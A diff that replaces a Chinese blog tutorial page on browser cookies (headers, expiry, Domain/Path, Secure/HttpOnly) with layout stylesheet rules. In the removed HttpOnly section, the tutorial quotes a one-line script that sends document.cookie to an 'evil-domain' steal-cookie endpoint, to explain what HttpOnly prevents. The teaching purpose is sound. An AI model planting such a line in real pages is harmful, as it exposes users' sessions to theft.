@@ -1,324 +1,179 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>10.4 Cookie | DolphinHome的博客</title><meta name="description" content="详情内容  Cookie概述Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。 Cookie 主要保存状态信息，以下是一些主要用途。  对话（session）管理：保存登录、购物车等需要记录的信息。 个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。 追踪用户：记录和分析用户行为。  Cookie 不是"><meta name="keywords" content="JavaScript"><meta name="author" content="DolphinHome"><meta name="copyright" content="DolphinHome"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://dolphinhome.gitee.io/2020/08/01/JavaScript/10.%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/4.Cookie/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="10.4 Cookie"><meta property="og:url" content="http://dolphinhome.gitee.io/2020/08/01/JavaScript/10.%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/4.Cookie/"><meta property="og:site_name" content="DolphinHome的博客"><meta property="og:description" content="详情内容  Cookie概述Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。 Cookie 主要保存状态信息，以下是一些主要用途。  对话（session）管理：保存登录、购物车等需要记录的信息。 个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。 追踪用户：记录和分析用户行为。  Cookie 不是"><meta property="og:image" content="https://gitee.com/dolphinhome/picture_bed/raw/master/11.jpg"><meta property="article:published_time" content="2020-08-01T01:13:08.000Z"><meta property="article:modified_time" content="2020-08-01T06:44:05.781Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
-  document.documentElement.setAttribute('data-theme', 'dark')
-  if (document.querySelector('meta[name="theme-color"]') !== null) {
-    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
+#article-container ol,
+#article-container ul {
+  margin-top: 0.4rem;
+}
+#article-container ol p,
+#article-container ul p {
+  margin: 0 0 0.5rem;
+}
+#article-container ol ol,
+#article-container ul ol,
+#article-container ol ul,
+#article-container ul ul {
+  padding-left: 0.5rem;
+}
+#article-container ol li,
+#article-container ul li {
+  position: relative;
+  margin: 0.3rem 0;
+  padding-left: 0.3rem;
+}
+a {
+  color: $a-link-color;
+  text-decoration: none;
+  word-wrap: break-word;
+  transition: all 0.2s;
+  overflow-wrap: break-word;
+}
+a:hover {
+  color: $light-blue;
+}
+a.fancybox {
+  outline: none;
+  display: inline-block;
+  width: 100%;
+  text-align: center;
+}
+a.fancybox:focus {
+  outline: none;
+}
+img {
+  max-width: 100%;
+  transition: all 0.2s;
+}
+.katex-wrap {
+  overflow: auto;
+}
+.katex-wrap::-webkit-scrollbar {
+  display: none;
+}
+.layout_post {
+  margin: 0 auto;
+  padding: 2rem 15px;
+  max-width: 1000px;
+}
+.layout_post img {
+  display: block;
+}
+.layout_post .tag_share .post-meta__tag-list {
+  display: inline-block;
+}
+.layout_post .tag_share .post-meta__tags {
+  display: inline-block;
+  margin: 0.4rem 0.4rem 0.4rem 0;
+  padding: 0 0.6rem;
+  width: fit-content;
+  border: 1px solid $light-blue;
+  border-radius: 0.6rem;
+  color: $light-blue;
+  font-size: 12px;
+  cursor: pointer;
+  transition: all 0.2s ease-in-out;
+}
+.layout_post .tag_share .post-meta__tags:hover {
+  background: $light-blue;
+  color: $button-color;
+}
+.layout_post .tag_share .post_share {
+  display: inline-block;
+  float: right;
+  margin: 0.4rem 0;
+  width: fit-content;
+}
+.layout_post .tag_share .post_share .social-share {
+  font-size: 12px;
+}
+.layout_post .tag_share .post_share .social-share .social-share-icon {
+  margin: 0 4px;
+  width: 26px;
+  height: 26px;
+  font-size: 15px;
+  line-height: 25px;
+}
+.layout_post .post-copyright {
+  position: relative;
+  margin: 2rem 0 0.5rem;
+  padding: 0.5rem 0.8rem;
+  border: 1px solid $light-grey;
+  transition: box-shadow 0.3s ease-in-out;
+}
+.layout_post .post-copyright:before {
+  position: absolute;
+  top: 0.5rem;
+  right: 0.5rem;
+  width: 0.8rem;
+  height: 0.8rem;
+  border-radius: 0.8rem;
+  background: $light-blue;
+  content: '';
+}
+.layout_post .post-copyright:after {
+  position: absolute;
+  top: 0.7rem;
+  right: 0.7rem;
+  width: 0.4rem;
+  height: 0.4rem;
+  border-radius: 0.4rem;
+  background: $white;
+  content: '';
+}
+.layout_post .post-copyright:hover {
+  box-shadow: 0 0 8px 0 rgba(232,237,250,0.6), 0 2px 4px 0 rgba(232,237,250,0.5);
+}
+.layout_post .post-copyright .post-copyright-meta {
+  color: $light-blue;
+  font-weight: bold;
+}
+.layout_post .post-copyright .post-copyright-info {
+  padding-left: 0.3rem;
+}
+.layout_post .post-copyright .post-copyright-info a {
+  text-decoration: underline;
+  word-break: break-word;
+}
+.layout_post .post-copyright .post-copyright-info a:hover {
+  text-decoration: none;
+}
+#article-container {
+  word-wrap: break-word;
+  overflow-wrap: break-word;
+}
+#article-container a {
+  color: $theme-link-color;
+}
+#article-container a:hover {
+  text-decoration: underline;
+}
+#article-container img {
+  margin: 0 auto 0.8rem;
+}
+#article-container p {
+  margin: 0 0 0.8rem;
+}
+#article-container iframe {
+  margin: 0 0 1rem;
+}
+@media screen and (max-width: 1024px) {
+  .layout_post {
+    width: auto;
   }
 }
-var activateLightMode = function () {
-  document.documentElement.setAttribute('data-theme', 'light')
-  if (document.querySelector('meta[name="theme-color"]') !== null) {
-    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
+@media screen and (max-width: $sm) {
+  .layout_post {
+    padding: 1rem 5px;
+  }
+  .layout_post > #post {
+    padding: 1.8rem 0.7rem;
   }
 }
-
-var getCookies = function (name) {
-  const value = `; ${document.cookie}`
-  const parts = value.split(`; ${name}=`)
-  if (parts.length === 2) return parts.pop().split(';').shift()
+@media screen and (min-width: $lr) {
+  .layout_post {
+    max-width: 1300px;
+  }
+  .layout_page {
+    max-width: 1500px;
+  }
+  .layout_page.hide-aside {
+    max-width: 1300px;
+  }
 }
-
-var autoChangeMode = 'false'
-var t = getCookies('theme')
-if (autoChangeMode === '1') {
-  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
-  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
-  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
-  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
-
-  if (t === undefined) {
-    if (isLightMode) activateLightMode()
-    else if (isDarkMode) activateDarkMode()
-    else if (isNotSpecified || hasNoSupport) {
-      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
-      var now = new Date()
-      var hour = now.getHours()
-      var isNight = hour <= 6 || hour >= 18
-      isNight ? activateDarkMode() : activateLightMode()
-    }
-    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
-      if (Cookies.get('theme') === undefined) {
-        e.matches ? activateDarkMode() : activateLightMode()
-      }
-    })
-  } else if (t === 'light') activateLightMode()
-  else activateDarkMode()
-} else if (autoChangeMode === '2') {
-  now = new Date()
-  hour = now.getHours()
-  isNight = hour <= 6 || hour >= 18
-  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
-  else if (t === 'light') activateLightMode()
-  else activateDarkMode()
-} else {
-  if (t === 'dark') activateDarkMode()
-  else if (t === 'light') activateLightMode()
-}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="prev" title="10.3 Navigator 对象，Screen 对象。" href="http://dolphinhome.gitee.io/2020/08/01/JavaScript/10.%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/3.Navigator%20%E5%AF%B9%E8%B1%A1%EF%BC%8CScreen%20%E5%AF%B9%E8%B1%A1%E3%80%82/"><link rel="next" title="10.6 同源限制" href="http://dolphinhome.gitee.io/2020/08/01/JavaScript/10.%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/6.%E5%90%8C%E6%BA%90%E9%99%90%E5%88%B6/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
-  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  bookmark: {
-    message_prev: '按',
-    message_next: '键将本页加入书签'
-  },
-  runtime_unit: '天',
-  runtime: false,
-  copyright: undefined,
-  ClickShowText: undefined,
-  medium_zoom: false,
-  fancybox: true,
-  Snackbar: undefined,
-  justifiedGallery: {
-    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
-    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
-  },
-  baiduPush: false,
-  highlightCopy: true,
-  highlightLang: true,
-  isPhotoFigcaption: false,
-  islazyload: true,
-  isanchor: false    
-}</script><script>var GLOBAL_CONFIG_SITE = { 
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isSidebar: true
-  }</script><noscript><style>
-#nav {
-  opacity: 1
-}
-.justified-gallery img{
-  opacity: 1
-}
-</style></noscript><meta name="generator" content="Hexo 5.1.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">135</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">28</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cookie"><span class="toc-number">1.</span> <span class="toc-text">Cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie-%E4%B8%8E-HTTP-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">Cookie 与 HTTP 协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E5%9B%9E%E5%BA%94%EF%BC%9ACookie-%E7%9A%84%E7%94%9F%E6%88%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">HTTP 回应：Cookie 的生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%EF%BC%9ACookie-%E7%9A%84%E5%8F%91%E9%80%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">HTTP 请求：Cookie 的发送</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie-%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="toc-number">1.3.</span> <span class="toc-text">Cookie 的属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Expires%EF%BC%8CMax-Age"><span class="toc-number">1.3.1.</span> <span class="toc-text">Expires，Max-Age</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Domain%EF%BC%8CPath"><span class="toc-number">1.3.2.</span> <span class="toc-text">Domain，Path</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Secure%EF%BC%8CHttpOnly"><span class="toc-number">1.3.3.</span> <span class="toc-text">Secure，HttpOnly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SameSite"><span class="toc-number">1.3.4.</span> <span class="toc-text">SameSite</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#document-cookie"><span class="toc-number">1.4.</span> <span class="toc-text">document.cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.5.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://gitee.com/dolphinhome/picture_bed/raw/master/11.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">DolphinHome的博客</a></span><span class="pull-right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">10.4 Cookie</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2020-08-01 09:13:08"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2020-08-01</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-08-01 14:44:05"><i class="fas fa-history fa-fw"></i> 更新于 2020-08-01</span></time></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><a id="more"></a>
-
-<details>
-  <summary>详情内容</summary>
-
-<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。</p>
-<p>Cookie 主要保存状态信息，以下是一些主要用途。</p>
-<ul>
-<li>对话（session）管理：保存登录、购物车等需要记录的信息。</li>
-<li>个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。</li>
-<li>追踪用户：记录和分析用户行为。</li>
-</ul>
-<p>Cookie 不是一种理想的客户端储存机制。它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。只有那些每次请求都需要让服务器知道的信息，才应该放在 Cookie 里面。</p>
-<p>每个 Cookie 都有以下几方面的元数据。</p>
-<ul>
-<li>Cookie 的名字</li>
-<li>Cookie 的值（真正的数据写在这里面）</li>
-<li>到期时间（超过这个时间会失效）</li>
-<li>所属域名（默认为当前域名）</li>
-<li>生效的路径（默认为当前网址）</li>
-</ul>
-<p>举例来说，用户访问网址<code>www.example.com</code>，服务器在浏览器写入一个 Cookie。这个 Cookie 的所属域名为<code>www.example.com</code>，生效路径为根路径<code>/</code>。如果 Cookie 的生效路径设为<code>/forums</code>，那么这个 Cookie 只有在访问<code>www.example.com/forums</code>及其子路径时才有效。以后，浏览器访问某个路径之前，就会找出对该域名和路径有效，并且还没有到期的 Cookie，一起发送给服务器。</p>
-<p>用户可以设置浏览器不接受 Cookie，也可以设置不向服务器发送 Cookie。<code>window.navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.navigator.cookieEnabled &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>
-
-<p><code>document.cookie</code>属性返回当前网页的 Cookie。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x2F;&#x2F; &quot;id&#x3D;foo;key&#x3D;bar&quot;</span><br></pre></td></tr></table></figure>
-
-<p>不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。</p>
-<p>浏览器的同源政策规定，两个网址只要域名相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，<code>http://example.com</code>设置的 Cookie，可以被<code>https://example.com</code>读取。</p>
-<h2 id="Cookie-与-HTTP-协议"><a href="#Cookie-与-HTTP-协议" class="headerlink" title="Cookie 与 HTTP 协议"></a>Cookie 与 HTTP 协议</h2><p>Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。</p>
-<h3 id="HTTP-回应：Cookie-的生成"><a href="#HTTP-回应：Cookie-的生成" class="headerlink" title="HTTP 回应：Cookie 的生成"></a>HTTP 回应：Cookie 的生成</h3><p>服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个<code>Set-Cookie</code>字段。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:foo&#x3D;bar</span><br></pre></td></tr></table></figure>
-
-<p>上面代码会在浏览器保存一个名为<code>foo</code>的 Cookie，它的值为<code>bar</code>。</p>
-<p>HTTP 回应可以包含多个<code>Set-Cookie</code>字段，即在浏览器生成多个 Cookie。下面是一个例子。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK</span><br><span class="line">Content-type: text&#x2F;html</span><br><span class="line">Set-Cookie: yummy_cookie&#x3D;choco</span><br><span class="line">Set-Cookie: tasty_cookie&#x3D;strawberry</span><br><span class="line"></span><br><span class="line">[page content]</span><br></pre></td></tr></table></figure>
-
-<p>除了 Cookie 的值，<code>Set-Cookie</code>字段还可以附加 Cookie 的属性。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Expires&#x3D;&lt;date&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Max-Age&#x3D;&lt;non-zero-digit&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Domain&#x3D;&lt;domain-value&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Path&#x3D;&lt;path-value&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Secure</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; HttpOnly</span><br></pre></td></tr></table></figure>
-
-<p>上面的几个属性的含义，将在后文解释。</p>
-<p>一个<code>Set-Cookie</code>字段里面，可以同时包括多个属性，没有次序的要求。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Domain&#x3D;&lt;domain-value&gt;; Secure; HttpOnly</span><br></pre></td></tr></table></figure>
-
-<p>下面是一个例子。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id&#x3D;a3fWa; Expires&#x3D;Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的<code>key</code>、<code>domain</code>、<code>path</code>和<code>secure</code>都匹配。举例来说，如果原始的 Cookie 是用如下的<code>Set-Cookie</code>设置的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key1&#x3D;value1; domain&#x3D;example.com; path&#x3D;&#x2F;blog</span><br></pre></td></tr></table></figure>
-
-<p>改变上面这个 Cookie 的值，就必须使用同样的<code>Set-Cookie</code>。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key1&#x3D;value2; domain&#x3D;example.com; path&#x3D;&#x2F;blog</span><br></pre></td></tr></table></figure>
-
-<p>只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key1&#x3D;value2; domain&#x3D;example.com; path&#x3D;&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>上面的命令设置了一个全新的同名 Cookie，但是<code>path</code>属性不一样。下一次访问<code>example.com/blog</code>的时候，浏览器将向服务器发送两个同名的 Cookie。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: key1&#x3D;value1; key1&#x3D;value2</span><br></pre></td></tr></table></figure>
-
-<p>上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。</p>
-<h3 id="HTTP-请求：Cookie-的发送"><a href="#HTTP-请求：Cookie-的发送" class="headerlink" title="HTTP 请求：Cookie 的发送"></a>HTTP 请求：Cookie 的发送</h3><p>浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的<code>Cookie</code>字段。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: foo&#x3D;bar</span><br></pre></td></tr></table></figure>
-
-<p>上面代码会向服务器发送名为<code>foo</code>的 Cookie，值为<code>bar</code>。</p>
-<p><code>Cookie</code>字段可以包含多个 Cookie，使用分号（<code>;</code>）分隔。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: name&#x3D;value; name2&#x3D;value2; name3&#x3D;value3</span><br></pre></td></tr></table></figure>
-
-<p>下面是一个例子。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;sample_page.html HTTP&#x2F;1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: yummy_cookie&#x3D;choco; tasty_cookie&#x3D;strawberry</span><br></pre></td></tr></table></figure>
-
-<p>服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。</p>
-<ul>
-<li>Cookie 的各种属性，比如何时过期。</li>
-<li>哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。</li>
-</ul>
-<h2 id="Cookie-的属性"><a href="#Cookie-的属性" class="headerlink" title="Cookie 的属性"></a>Cookie 的属性</h2><h3 id="Expires，Max-Age"><a href="#Expires，Max-Age" class="headerlink" title="Expires，Max-Age"></a>Expires，Max-Age</h3><p><code>Expires</code>属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行格式转换。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id&#x3D;a3fWa; Expires&#x3D;Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure>
-
-<p>如果不设置该属性，或者设为<code>null</code>，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。</p>
-<p><code>Max-Age</code>属性指定从现在开始 Cookie 存在的秒数，比如<code>60 * 60 * 24 * 365</code>（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。</p>
-<p>如果同时指定了<code>Expires</code>和<code>Max-Age</code>，那么<code>Max-Age</code>的值将优先生效。</p>
-<p>如果<code>Set-Cookie</code>字段没有指定<code>Expires</code>或<code>Max-Age</code>属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。</p>
-<h3 id="Domain，Path"><a href="#Domain，Path" class="headerlink" title="Domain，Path"></a>Domain，Path</h3><p><code>Domain</code>属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 Cookie。比如，<code>example.com</code>不设置 Cookie 的<code>domain</code>属性，那么<code>sub.example.com</code>将不会附带这个 Cookie。如果指定了<code>domain</code>属性，那么子域名也会附带这个 Cookie。如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 Cookie。</p>
-<p><code>Path</code>属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，<code>Path</code>属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，<code>PATH</code>属性是<code>/</code>，那么请求<code>/docs</code>路径也会包含该 Cookie。当然，前提是域名必须一致。</p>
-<h3 id="Secure，HttpOnly"><a href="#Secure，HttpOnly" class="headerlink" title="Secure，HttpOnly"></a>Secure，HttpOnly</h3><p><code>Secure</code>属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的<code>Secure</code>属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。</p>
-<p><code>HttpOnly</code>属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是<code>document.cookie</code>属性、<code>XMLHttpRequest</code>对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(new Image()).src &#x3D; &quot;http:&#x2F;&#x2F;www.evil-domain.com&#x2F;steal-cookie.php?cookie&#x3D;&quot; + document.cookie;</span><br></pre></td></tr></table></figure>
-
-<p>上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的<code>HttpOnly</code>属性，上面代码就不会读到该 Cookie。</p>
